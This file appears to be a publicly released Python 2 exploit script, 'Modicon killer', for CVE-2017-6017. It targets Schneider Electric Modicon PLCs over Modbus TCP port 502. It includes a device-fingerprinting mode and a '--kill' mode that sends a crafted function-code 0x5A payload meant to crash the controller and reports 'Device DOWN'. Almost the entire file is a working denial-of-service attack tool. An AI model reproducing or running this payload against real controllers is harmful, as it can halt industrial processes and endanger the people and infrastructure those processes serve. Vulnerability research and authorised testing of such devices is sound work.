# -*- coding: utf-8 -*-
import time
import socket
import sys
import argparse

banner = '''
	                               /$$ /$$                                    
	                              | $$|__/                                    
	 /$$$$$$/$$$$   /$$$$$$   /$$$$$$$ /$$  /$$$$$$$  /$$$$$$  /$$$$$$$       
	| $$_  $$_  $$ /$$__  $$ /$$__  $$| $$ /$$_____/ /$$__  $$| $$__  $$      
	| $$ \ $$ \ $$| $$  \ $$| $$  | $$| $$| $$      | $$  \ $$| $$  \ $$      
	| $$ | $$ | $$| $$  | $$| $$  | $$| $$| $$      | $$  | $$| $$  | $$      
	| $$ | $$ | $$|  $$$$$$/|  $$$$$$$| $$|  $$$$$$$|  $$$$$$/| $$  | $$      
	|__/ |__/ |__/ \______/  \_______/|__/ \_______/ \______/ |__/  |__/      
									                                                                          
	 /$$       /$$ /$$ /$$                                                    
	| $$      |__/| $$| $$                                                    
	| $$   /$$ /$$| $$| $$  /$$$$$$   /$$$$$$                                 
	| $$  /$$/| $$| $$| $$ /$$__  $$ /$$__  $$                                
	| $$$$$$/ | $$| $$| $$| $$$$$$$$| $$  \__/                                
	| $$_  $$ | $$| $$| $$| $$_____/| $$                                      
	| $$ \  $$| $$| $$| $$|  $$$$$$$| $$                                      
	|__/  \__/|__/|__/|__/ \_______/|__/   

		Modicon killer v1.0.1
'''

bannerInfo = '''
 # Exploit Title: \t"DOS Modicon via Modbus Injection" 
 # CVE: \t\tCVE-2017-6017
 # CVSS Base Score v3: \t8.6 / 10
 # CVSS Vector String:\tAV:N/AC:L/PR:N/UI:N/S:C/C:N/I:N/A:H  
 # Date: \t\t2/01/2018
 # Exploit Author: \tFernandez Ezequiel ( @capitan_alfa ) 
 # Vendor: \t\tSchneider Electric
 # Devices vuln:
 			• M340 CPUs with firmware prior to V2.9
			• M580 CPUs with firmware prior to V2.3
			• Quantum CPUs with firmware prior to V3.52
			• Premium CPUs all versions
			• M1E CPUs all versions
 '''

parser = argparse.ArgumentParser(prog='mdKiller.py',
								description=' [+] DOS Modicon via Modbus Injection. (CVE: 2018-???? )', 
								epilog='[+] Demo: mdKiller.py --sid 00 --host <target> --check/kill',
								version="1.0")

parser.add_argument('--sid',  dest="SlaveID", help='Slave ID (default 00)', default="00")
parser.add_argument('--host', dest="HOST",    help='Host',required=True)
parser.add_argument('--port', dest="PORT",    help='Port (default 502)',type=int,default=502)

parser.add_argument('--check',dest="CHECK",   help='Show device info ',action="store_true")
parser.add_argument('--kill', dest="KILL",    help='Check availability',action="store_true")

args        	= 	parser.parse_args()

HST   			= 	args.HOST
SID 			= 	str(args.SlaveID) # now hex (00 to ff). switch to int (0 to 255) !!!!
portModbus		= 	args.PORT
checkDev		= 	bool(args.CHECK)
killerPLC 		= 	bool(args.KILL)


class Colors:
    BLUE 		= '\033[94m'
    GREEN 		= '\033[32m'
    RED 		= '\033[0;31m'
    DEFAULT		= '\033[0m'
    ORANGE 		= '\033[33m'
    WHITE 		= '\033[97m'
    BOLD 		= '\033[1m'
    BR_COLOUR 	= '\033[1;37;40m'

_modbus_obj_description = {  
						0: "VendorName",	
						1: "ProductCode",	
						#2: "MajorMinorRevision",
						2: "Revision",		
						3: "VendorUrl",	
						4: "ProductName",	
						5: "ModelName",	
						#6: "UserApplicationName",
						6: "User App Name",
						7: "Reserved",	
						8: "Reserved",	
						9: "Reserved",	
						10: "Reserved",	
						128: "Private objects",
						255: "Private objects"		
}
def noConnection():
	print Colors.BLUE+"\n // ------------------------------------------------- //"
	print Colors.RED+"\t [!] Fail Connection "
	print Colors.RED+"\t [!] GAME OVER"
	print Colors.GREEN+"\t [+] Device DOWN"	
	print Colors.BLUE+" // ------------------------------------------------- //\n\n"+Colors.DEFAULT		
	sys.exit(0)

func_code 	= '2b'  # Device Identification
meiType 	= '0e'  # MODBUS Encapsulated Interface - 0e / 0d
read_code	= '03'  # 01 / 02 / 03 / 04 
obj_id 		= '00' 

# --MBAP 7 Bytes --------------------------------------------------------  #
# Return a string with the modbus header
def create_header_modbus(length,unit_id):
    trans_id = "4462"
    proto_id = "0000"
    protoLen = length.zfill(4)
    unit_id = unit_id

    return trans_id + proto_id + protoLen + unit_id.zfill(2)

modbusRequest = 	create_header_modbus('5',SID)
modbusRequest +=	func_code
modbusRequest += 	meiType
modbusRequest += 	read_code
modbusRequest += 	obj_id

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.settimeout(3)

def get_obj_DevInfo(reqMD):
	try:
		# me podre conectar ?
		client.connect((HST,int(portModbus)))
	except Exception, e:
	 	if str(e) == "timed out":
			noConnection()
	 	else:
		 	print Colors.GREEN+" [+] "+str(e)+Colors.DEFAULT
			noConnection()                      
	
	client.send(reqMD.decode('hex'))

	try:
		# get_obj_DevInfo()
		# Tendremos respuesta ?
		MbResponse = client.recv(2048)
	except Exception, e:
		# game over
		if str(e) == "timed out":
		 	print Colors.GREEN+str(e)+Colors.DEFAULT

		 	print Colors.BLUE+"\n // ------------------------------------------------- //"
			print Colors.RED+"\t [+] GAME OVER"	
			print Colors.GREEN+"\t [+] Device DOWN !!!"	
			print Colors.BLUE+" // ------------------------------------------------- //\n\n"+Colors.DEFAULT
		else:
			print Colors.GREEN+str(e)+Colors.DEFAULT
		sys.exit(0)
	
	aframe = MbResponse.encode('hex')

	print  Colors.BLUE+' [+] Host: \t\t' +Colors.RED+HST+Colors.DEFAULT
	print  Colors.BLUE+' [+] Port: \t\t' +Colors.ORANGE+str(portModbus)+Colors.DEFAULT
	print  Colors.BLUE+' [+] Slave ID: \t\t' +Colors.RED+aframe[12:14]+Colors.DEFAULT

	respCode 	= aframe[14:16]
	totalObjs 	= aframe[26:28]
	firstObj 	= 28

	try:
		try:
			objTot = aframe[26:28]
			nObjeto = int(objTot,16)
		except:
			#objTot = '0'
			nObjeto = int('0',10)

		print Colors.BLUE+' [+] TotalObj: \t\t'+Colors.RED+str(nObjeto)+"\n"+Colors.DEFAULT
		pInicial = 28

		for i in xrange(0,nObjeto):
			pInicial+=4
			longitud = aframe[pInicial-2:pInicial]
			longitud = int(longitud,16) 
							
			valueStr = aframe[pInicial:pInicial+longitud *2 ]
			objVal   = valueStr.decode("hex")

			try:
				obj_nm =_modbus_obj_description[i]
			except:
				obj_nm ='objName X'

			print Colors.BOLD+ " [*]  "+Colors.GREEN+ obj_nm +': \t'+Colors.ORANGE+objVal+Colors.DEFAULT
			pInicial+=longitud*2
	
	except Exception, e:
		print  Colors.BR_COLOUR+Colors.RED+'\n [!] no device info' + Colors.DEFAULT
		print e
	client.close()

	print "\n"

def plcKiller(pduInjection):
	reqst = {}
	lenPdu = str((len(pduInjection)/2)+1)
	reqst[0] =	create_header_modbus(lenPdu,SID)
	reqst[1] =	pduInjection

	MB_Request = 	reqst[0] # header
	MB_Request +=	reqst[1] # pdu

	try:
		# podremos conectarnos ?
		client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		client.settimeout(2)
		client.connect((HST,portModbus))
	except Exception, e:
		# game over; No conecction !
		noConnection()		

	mbKiller = MB_Request.decode('hex')
	
	injection = Colors.GREEN+reqst[0]+Colors.RED+reqst[1]+Colors.DEFAULT
	print " [+] Bad Injection: \t"+injection

	client.send(mbKiller) # enviamos ==> "header" + \x5a\x00\x20\x00\x00 
	
	try:
		# tendremos respuesta ?
		# Si responde, el device no es vulnerable
		modResponse = (client.recv(1024))	
		print " [+] Response: \t\t"+modResponse.encode("hex")
		print " [+] Response(dec): \t"+modResponse

		print Colors.BLUE+"\n // ------------------------------------------------- //"
		print Colors.ORANGE+"\t [+] NO vulnerable"	
		print Colors.GREEN+"\t [+] Device UP !!!"	
		print Colors.BLUE+" // ------------------------------------------------- //\n\n"+Colors.DEFAULT
	except Exception, e:
	 	print " [!] No Response: \t"+Colors.RED+str(e)+Colors.DEFAULT
		print Colors.BLUE+"\n // ------------------------------------------------- //"
		print Colors.RED+"\t [+] Vulnerable"	
		print Colors.ORANGE+"\t [!] GAME OVER"
		print Colors.GREEN+"\t [+] Device DOWN !!!"	
		print Colors.BLUE+" // ------------------------------------------------- //\n\n"+Colors.DEFAULT		
	
	client.close()
	sys.exit(0)

def main():
	print Colors.GREEN+banner+Colors.DEFAULT
	print Colors.BLUE+bannerInfo+Colors.DEFAULT


	if checkDev == True:
		get_obj_DevInfo(modbusRequest)	

	elif killerPLC == True:
		# contemplar injectiones manuales !!!
		plcKiller(pduInjection="5a00200000") 
	else:
		sys.exit(0)

main()